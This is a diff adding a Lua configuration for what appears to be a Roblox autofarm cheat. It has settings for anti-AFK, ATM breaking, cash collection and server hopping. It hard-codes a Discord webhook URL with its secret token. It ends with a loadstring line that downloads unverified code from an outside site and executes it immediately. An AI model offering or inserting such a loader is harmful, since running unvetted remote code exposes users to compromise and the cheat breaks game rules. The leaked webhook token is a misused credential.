@@ -1,0 +1,37 @@
+script_key = 'YOUR_KEY'
+getgenv().AutofarmSettings = {
+  ["Config"] = {
+    ["Fps"] = 15,
+    ["Modalidad"] = 1,
+    ["AntiAFK"] = true,
+    ["MAX_PLAYERS"] = 0,
+    ["PrioritizeShooting"] = true --Set to true if private server
+  },
+
+  ["CashInterval"] = {
+    ["CollectTimer"] = 2,
+    ["BreakATM"] = 0.1,
+    ["PickupInterval"] = 0.3,
+    ["BeforePicking"] = 0.01
+  },
+
+  ["Webhook"] = {
+    ["URL"] = "https://discord.com/api/webhooks/1271568821190393916/7IwhdsVh1UsFazS8Zu9ufa8OUQ1jtQle-jQ2-mVP6o-H81GnJQ_2yXVIOdddLsn7V77C",
+    ["Interval"] = 30
+  },
+
+  ["ServerHoop"] = {
+    ["Toggle"] = false,
+    ["Type"] = 1,
+    ["Knocks"] = 0,
+    ["Time"] = 0,
+    ["Blacklisted_IDs"] = {}
+  },
+
+  ["Vault_System"] = {
+    ["System"] = "On",
+    ["Forced_Vault"] = true
+  }
+}
+
+loadstring(game:HttpGet("https://kamaik-autofarm.uk/loader.lua"))()
